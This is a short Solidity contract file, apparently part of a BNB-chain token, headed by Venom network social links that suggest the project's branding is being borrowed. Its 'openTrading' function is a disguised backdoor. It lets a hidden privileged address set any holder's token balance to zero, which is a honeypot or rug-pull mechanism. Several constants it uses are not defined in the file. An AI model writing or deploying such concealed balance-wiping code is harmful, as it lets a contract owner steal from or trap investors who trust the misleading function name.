/*  
   * SPDX-License-Identifier: MIT

     // Telegram:  https://t.me/Venom
    // Twitter: https://twitter.com/Venom_network_
    // Website: https://venom.network/
    // Medium:  https://medium.com/@venom.foundation
    // Discord:  https://discord.com/invite/E5JdCbFFW7

*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
